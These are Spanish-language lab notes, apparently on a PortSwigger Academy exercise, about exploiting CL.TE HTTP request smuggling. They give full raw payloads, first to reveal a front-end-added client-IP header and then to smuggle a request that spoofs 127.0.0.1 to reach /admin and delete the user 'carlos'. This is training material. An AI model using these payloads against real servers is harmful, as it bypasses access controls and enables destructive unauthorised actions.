En esta clase aprendemos a aprovechar una vulnerabilidad de HTTP request smuggling para identificar cabeceras que el servidor front-end añade a las peticiones entrantes. Estas cabeceras pueden determinar el acceso a zonas restringidas, como el panel de administración.

Primero, utilizamos un ataque de tipo CL.TE para inyectar una petición secundaria y observar cómo el front-end reescribe el tráfico. Al examinar la respuesta del back-end, logramos identificar la cabecera que transporta la IP del cliente. Luego, reproducimos el ataque incluyendo esta cabecera manualmente con el valor 127.0.0.1, lo que nos permite acceder al panel /admin.

Finalmente, modificamos la petición smuggled para apuntar a ‘**/admin/delete?username=carlos**‘, logrando así eliminar al usuario objetivo y resolver el laboratorio.

Solucion
en este caso vamos a interceptar el input que ponemos en la parte principal de la pagina esto se hace poniendo cual quiercosa en la barra de busquedad
![Pasted_image_20250807210951.png](Imagenes/Pasted_image_20250807210951.png)
lo interceptamos esta ves solo ponemos el http1.1
Entonces lo primero seria poner esta peticion para poder sacar una cabecera que es la que nos llevara a /admin
(POST / HTTP/1.1

Host: 0a5e007e041839cb80d0534500f30052.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Content-Length: 56

Transfer-Encoding: chunked



0



POST / HTTP/1.1

Content-Length: 200



search=test)
y esto se veria asi
![Pasted_image_20250807213247.png](Imagenes/Pasted_image_20250807213247.png)
Y si nosotros no podemos ver la cabecera como en forma de error en el render solamente actualizamos la pagina principal para pdoer visualizarlo
![Pasted_image_20250807213343.png](Imagenes/Pasted_image_20250807213343.png)
y ya al final lo adaptmaos a nuestro payload final
doble send y con esto terminamos
![Pasted_image_20250807213709.png](Imagenes/Pasted_image_20250807213709.png)
Payload(POST / HTTP/1.1

Host: 0a5e007e041839cb80d0534500f30052.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Content-Length: 106

Transfer-Encoding: chunked



0



GET /admin/delete?username=carlos HTTP/1.1

X-ppcVGN-Ip: 127.0.0.1

Content-Length: 13



search=test)